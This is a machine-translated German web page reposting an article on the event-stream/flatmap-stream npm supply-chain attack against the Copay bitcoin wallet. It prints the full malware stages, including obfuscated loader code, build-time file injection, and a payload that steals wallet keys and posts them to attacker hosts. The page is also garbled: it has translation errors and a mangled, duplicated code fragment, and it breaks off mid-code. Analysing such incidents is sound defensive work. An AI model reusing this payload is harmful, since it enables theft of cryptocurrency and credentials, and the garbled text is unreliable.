<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🎟️ 🧙🏻 👂🏽 Die Geschichte der unglaublichen Leichtigkeit, moderne Softwareentwicklungsinfrastruktur zu hacken ✍️ 🐓 👱🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ende Oktober wurde im äußerst beliebten Tool nodemon Node.js eine Problemmeldung angezeigt. Die Sache war, dass die folgende Warnung in der Konsole an...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Die Geschichte der unglaublichen Leichtigkeit, moderne Softwareentwicklungsinfrastruktur zu hacken</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/434116/"> Ende Oktober wurde im äußerst beliebten Tool nodemon Node.js eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Problemmeldung</a> angezeigt.  Die Sache war, dass die folgende Warnung in der Konsole angezeigt wurde: <code>DeprecationWarning: crypto.createDecipher is deprecated</code> .  Solche Warnungen über veraltete Funktionen sind keine Seltenheit.  Insbesondere sah diese Nachricht ziemlich harmlos aus.  Es bezog sich nicht einmal auf das Nodemon-Projekt selbst, sondern auf eine seiner Abhängigkeiten.  Diese Kleinigkeit könnte von niemandem bemerkt werden, da solche Probleme in vielen Fällen von selbst gelöst werden. <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/c03/31c/c19/c0331cc19ca77d9bc4ce383faec3c2b8.jpg" alt="Bild"></a> <br><br>  Ungefähr zwei Wochen nach der ersten Erwähnung dieses Problems überprüfte <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ayrton Sparling</a> alles und stellte fest, dass der Grund für die Warnung eine ziemlich tiefe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">neue Sucht war</a> .  Die Nachricht stammte von einem seltsamen Code am Ende einer minimierten JavaScript-Datei, die nicht in früheren Versionen der Bibliothek enthalten war und aus einer späteren Version gelöscht wurde.  Ayrtons Forschungen führten ihn zu dem beliebten Event-Stream-Paket npm, das etwa zwei Millionen Mal pro Woche heruntergeladen wird und bis vor kurzem von einem Open-Source-Entwickler mit einem guten Ruf kontrolliert wurde. <br><a name="habracut"></a><br>  Vor einigen Monaten wurde die Kontrolle über den Ereignisstrom auf eine andere Person übertragen, einen wenig bekannten Benutzer, der per E-Mail <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">darum bat</a> , ihm die Rechte zur Veröffentlichung des Pakets zu gewähren.  Dies wurde legal gemacht.  Anschließend aktualisierte dieser Benutzer das Event-Stream-Paket, einschließlich der Flatmap-Stream-Malware-Abhängigkeit in seiner Patch-Version, und veröffentlichte anschließend eine neue Hauptversion des Pakets ohne diese Abhängigkeit.  Dank dessen wollte er die Veränderung weniger auffällig machen.  Neue Benutzer, die angeblich eher an Abhängigkeiten interessiert sind, würden die neueste Version von event-stream installieren (4.x zum Zeitpunkt dieses Schreibens).  Benutzer, deren Projekte von der vorherigen Version des Pakets abhingen, installierten die infizierte Patch-Version automatisch, wenn sie das nächste Mal den Befehl <code>npm install</code> ausführen (dies berücksichtigt den gängigen Ansatz zum Konfigurieren von Paketversionen, die für Updates geeignet sind). <br><br><h2>  <font color="#3AC1EF">Details zu Vorfällen</font> </h2><br>  Der böswillige Flatmap-Stream-Code wurde für die Arbeit mit einer Datendatei konfiguriert, die zusätzlich zu einigen Zeilen, die sehr trivial verschleiert waren, zwei verschlüsselte Fragmente enthielt, die nur durch Kenntnis des Kennworts entschlüsselt werden konnten. <br><br><pre> <code class="javascript hljs">! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,           t = process;       <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">) </span></span>{           <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()       }       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),           o = t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!o) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u = r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]), o),           a = u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>], e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]), e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));       a += u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;       f.paths = <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths, f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a, <span class="hljs-string"><span class="hljs-string">""</span></span>), f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (r) {} }();</code> </pre> <br>  Nennen Sie dieses Codefragment <code>Payload A</code>  Es sucht nach dem Kennwort in der Umgebungsvariablen <code>npm_package_description</code> , die von npm festgelegt wurde.  Diese Umgebungsvariable enthält eine Beschreibung des Stammpakets, mit der bösartiger Code nur ein bestimmtes Zielpaket betreffen kann.  Kluger Schachzug!  In diesem Fall war dieses Paket die Clientanwendung der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Copay-Bitcoin-Geldbörse</a> , und das Kennwort zum Entschlüsseln des Schadcodes lautete die Phrase <a href="">A Secure Bitcoin Wallet</a> (dies wurde vom <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gathub-</a> Benutzer <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">maths22 entdeckt</a> ). <br><br>  Nachdem der <code>Payload A</code> Code das erste Datenelement erfolgreich entschlüsselt hatte, wurde der Code ausgeführt, den wir <code>Payload B</code> nennen. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-regexp"><span class="hljs-regexp">/build\:.*\-release/</span></span>.test(process.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = process.env.npm_package_description,           r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"fs"</span></span>),           i = <span class="hljs-string"><span class="hljs-string">"./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"</span></span>,           n = r.statSync(i),           c = r.readFileSync(i, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>),           o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>).createDecipher(<span class="hljs-string"><span class="hljs-string">"aes256"</span></span>, t),           s = o.update(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>);       s = <span class="hljs-string"><span class="hljs-string">"\n"</span></span> + (s += o.final(<span class="hljs-string"><span class="hljs-string">"utf8"</span></span>));       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = c.indexOf(<span class="hljs-string"><span class="hljs-string">"\n/*@@*/"</span></span>);       <span class="hljs-number"><span class="hljs-number">0</span></span> &lt;= a &amp;&amp; (c = c.substr(<span class="hljs-number"><span class="hljs-number">0</span></span>, a)), r.writeFileSync(i, c + s, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime), process.on(<span class="hljs-string"><span class="hljs-string">"exit"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{           <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {               r.writeFileSync(i, c, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime)           } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}       })   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} };</code> </pre> <br>  Dieser Code überprüfte, ob das Skript ausschließlich mit einem bestimmten Befehlszeilenargument ausgeführt wurde, wobei etwas mit dem <code>build:*-release</code> Muster übereinstimmte.  Zum Beispiel könnte es so aussehen, als würde <code>npm run build:ios-release</code> .  Andernfalls wurde das Skript nicht ausgeführt.  Diese eingeschränkte Codeausführung beschränkt sich auf nur drei Skripte zum Erstellen von Projekten, die in Copay verwendet werden.  Es handelt sich nämlich um Skripte, die für die <a href="">Erstellung</a> der <a href="">Desktop-Version der Anwendung und ihrer Versionen für iOS und Android verantwortlich sind</a> . <br><br>  Dann suchte das Skript nach einer anderen Anwendungsabhängigkeit, nämlich dass er an der Datei <code>ReedSolomonDecoder.js</code> aus dem Paket <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">@ zxing / library</a> interessiert war.  Der <code>Payload B</code> Code hat diese Datei nicht ausgeführt.  Er hat einfach <code>Payload C</code> Code <code>ReedSolomonDecoder</code> , was dazu führte, dass dieser Code beim <code>ReedSolomonDecoder</code> in der Anwendung selbst <code>ReedSolomonDecoder</code> .  Hier ist der <code>Payload C</code> Code. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{       <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>),               a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>),               c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"</span></span>;           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{               e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString();               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({                   <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e,                   <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t,                   <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: {                       <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length,                       <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span>                   }               }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{});               r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end()           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>);                   n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span>               }               i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n)           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory;                   resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       e.getFile(t, {                           <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span>                       }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader;                               t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{                                   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result))                               }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                                   t.abort()                               }, t.readAsText(e)                           })                       })                   })               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t);                       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r))                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t]))                       })                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               }           }           global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t];                   <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>;                       t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t)))                   }.bind(n))               }           });           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>);           e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e);               <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey))               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t           }       } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}   }   <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e()</code> \ nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C \ nDXUs / peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj \ nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW + / BiGud7b77Fwfq372fUuEIk \ N2P / pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762 \ nPDBMwQsCKQcpKDXw / 6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz \ nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl / cJ / x76To \ n2wIDAQAB \ n ----- END <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{       <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>),               a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>),               c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"</span></span>;           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{               e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString();               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({                   <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e,                   <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t,                   <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: {                       <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length,                       <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span>                   }               }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{});               r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end()           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span 